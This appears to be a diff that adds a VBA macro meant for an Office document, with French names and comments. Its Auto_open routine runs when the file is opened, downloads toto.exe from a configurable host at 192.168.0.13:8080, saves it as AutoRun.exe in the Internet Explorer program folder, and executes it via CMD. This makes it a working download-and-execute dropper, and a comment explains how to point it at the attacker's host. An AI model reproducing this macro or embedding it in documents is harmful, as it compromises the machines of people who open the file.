@@ -1,0 +1,32 @@
+Private Declare PtrSafe Function TelechargerFichierURL Lib "urlmon" _
+Alias "URLDownloadToFileA" _
+(ByVal pCaller As Long, _
+ByVal szURL As String, _
+ByVal szFileName As String, _
+ByVal dwReserved As Long, _
+ByVal lpfnCB As Long) As Long
+
+Private Const ERROR_SUCCESS As Long = 0
+Private Const BINDF_GETNEWESTVERSION As Long = &H10
+
+Public Function TelechargerFichierInternet(SourceUrl As String, FichierLocal As String) As Boolean
+TelechargerFichierInternet = TelechargerFichierURL(0&, SourceUrl, FichierLocal, BINDF_GETNEWESTVERSION, 0&) = ERROR_SUCCESS
+End Function
+
+Sub Auto_open()
+
+
+Dim fichier_internet As String
+Dim fichier_local As String
+
+'modifier l'adresse ip ci-dessous par l'adresse ip de la machine hote du fichier 
+
+fichier_internet = "http://192.168.0.13:8080/toto.exe"
+
+fichier_local = "C:\Program Files\Internet Explorer\AutoRun.exe"
+
+Call TelechargerFichierInternet(fichier_internet, fichier_local)
+
+Shell "CMD /C " & """" & "cd C:\Program Files\Internet Explorer && AutoRun" & """"
+
+End Sub
